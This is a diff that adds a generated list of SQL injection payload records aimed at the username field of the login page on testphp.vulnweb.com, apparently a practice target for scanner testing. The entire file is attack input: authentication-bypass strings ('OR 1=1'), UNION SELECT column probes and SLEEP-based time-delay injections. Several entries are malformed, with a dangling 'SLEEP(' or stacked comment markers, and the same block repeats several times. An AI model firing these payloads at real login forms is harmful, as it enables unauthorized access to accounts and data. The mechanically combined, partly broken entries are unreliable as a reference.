@@ -1,0 +1,250 @@
+{'type': 'Error-based', 'payload': "admin' OR 1=1 ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /* -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /* #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /* /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /* */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /* AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /* OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /* SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1; --", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1; -- -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1; -- #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1; -- /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1; -- */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1; -- AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1; -- OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1; -- SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 -- -", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 -- - -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 -- - #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 -- - /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 -- - */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 -- - AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 -- - OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 -- - SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # -", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # - -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # - #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # - /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # - */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # - AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # - OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # - SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' UNION SELECT NULL, NULL, NULL -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' UNION SELECT NULL, NULL, NULL --  -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' UNION SELECT NULL, NULL, NULL --  #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' UNION SELECT NULL, NULL, NULL --  /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' UNION SELECT NULL, NULL, NULL --  */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' UNION SELECT NULL, NULL, NULL --  AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' UNION SELECT NULL, NULL, NULL --  OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' UNION SELECT NULL, NULL, NULL --  SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Time-based', 'payload': "' OR SLEEP(5) -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR SLEEP(5) --  -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR SLEEP(5) --  #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR SLEEP(5) --  /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR SLEEP(5) --  */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR SLEEP(5) --  AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR SLEEP(5) --  OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR SLEEP(5) --  SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR IF(1=1, SLEEP(5), 0) -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR IF(1=1, SLEEP(5), 0) --  -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR IF(1=1, SLEEP(5), 0) --  #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR IF(1=1, SLEEP(5), 0) --  /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR IF(1=1, SLEEP(5), 0) --  */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR IF(1=1, SLEEP(5), 0) --  AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR IF(1=1, SLEEP(5), 0) --  OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR IF(1=1, SLEEP(5), 0) --  SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1 ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /* -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /* #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /* /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /* */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /* AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /* OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /* SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1; --", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1; -- -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1; -- #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1; -- /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1; -- */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1; -- AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1; -- OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1; -- SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 -- -", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 -- - -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 -- - #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 -- - /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 -- - */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 -- - AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 -- - OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 -- - SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # -", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # - -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # - #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # - /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # - */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # - AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # - OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # - SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' UNION SELECT NULL, NULL, NULL -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' UNION SELECT NULL, NULL, NULL --  -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' UNION SELECT NULL, NULL, NULL --  #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' UNION SELECT NULL, NULL, NULL --  /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' UNION SELECT NULL, NULL, NULL --  */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' UNION SELECT NULL, NULL, NULL --  AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' UNION SELECT NULL, NULL, NULL --  OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' UNION SELECT NULL, NULL, NULL --  SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Time-based', 'payload': "' OR SLEEP(5) -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR SLEEP(5) --  -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR SLEEP(5) --  #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR SLEEP(5) --  /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR SLEEP(5) --  */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR SLEEP(5) --  AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR SLEEP(5) --  OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR SLEEP(5) --  SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR IF(1=1, SLEEP(5), 0) -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR IF(1=1, SLEEP(5), 0) --  -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR IF(1=1, SLEEP(5), 0) --  #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR IF(1=1, SLEEP(5), 0) --  /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR IF(1=1, SLEEP(5), 0) --  */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR IF(1=1, SLEEP(5), 0) --  AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR IF(1=1, SLEEP(5), 0) --  OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Time-based', 'payload': "' OR IF(1=1, SLEEP(5), 0) --  SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Time-based'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1 ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
